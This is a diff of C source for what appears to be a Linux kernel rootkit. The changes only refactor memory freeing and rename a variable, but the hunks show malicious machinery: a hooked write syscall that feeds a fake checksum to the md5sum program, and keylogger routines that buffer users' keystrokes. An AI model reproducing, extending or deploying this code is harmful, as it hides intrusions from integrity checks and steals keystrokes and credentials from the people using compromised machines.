@@ -255,8 +255,7 @@ static void _md5log_cleanup_list(void) {
     list_for_each_entry_safe(node, node_safe, &md5_node, list) {
         prinfo("cleaning md5 node\n");
         list_del(&node->list);
-        kfree(node);
-        node = NULL;
+        kv_mem_free(&node);
     }
 }
 
@@ -325,7 +324,7 @@ out:
 static asmlinkage long m_write(struct pt_regs *regs) {
     struct fs_file_node *fs = fs_get_file_node(current);
     const char __user *buf;
-    char *obf = "md5sum";
+    char *exe = "md5sum";
     size_t count = PT_REGS_PARM3(regs);
     char md5[MD5LEN+1] = {0};
     char *fake;
@@ -333,7 +332,7 @@ static asmlinkage long m_write(struct pt_regs *regs) {
     if (!fs || !fs->filename)
         goto out;
 
-    if (strcmp(fs->filename, obf))
+    if (strcmp(fs->filename, exe))
         goto out;
 
     if (count <= MD5LEN)
@@ -353,8 +352,7 @@ static asmlinkage long m_write(struct pt_regs *regs) {
             prerr("m_write: copy_to_user\n");
 
 out:
-    if (fs)
-        kfree(fs);
+    kv_mem_free(&fs);
     return real_m_write(regs);
 }
 
@@ -850,7 +848,7 @@ static int _key_update(uid_t uid, char byte, int flags) {
                     strlen(node->buf));
 
             list_del(&node->list);
-            kfree(node);
+            kv_mem_free(&node);
         } else if((flags & R_RANGE) || (flags & R_NEWLINE)) {
             if (node->offset < MAXKEY) {
                 node->buf[node->offset++] = byte;
@@ -878,8 +876,7 @@ static void _keylog_cleanup_list(void) {
     struct keylog_t *node, *node_safe;
     list_for_each_entry_safe(node, node_safe, &keylog_node, list) {
         list_del(&node->list);
-        kfree(node);
-        node = NULL;
+        kv_mem_free(&node);
     }
 }
 
@@ -988,11 +985,7 @@ static ssize_t __attribute__((unused))
     }
 
 out:
-    if (ttybuf)
-        kfree(ttybuf);
-
-    if (fs)
-        kfree(fs);
+    kv_mem_free(&ttybuf, &fs);
     return rv;
 }
 
@@ -1301,7 +1294,6 @@ void sys_deinit(void) {
 
     list_for_each_entry_safe(sl, sl_safe, &sys_addr, list) {
         list_del(&sl->list);
-        kfree(sl);
-        sl = NULL;
+        kv_mem_free(&sl);
     }
 }
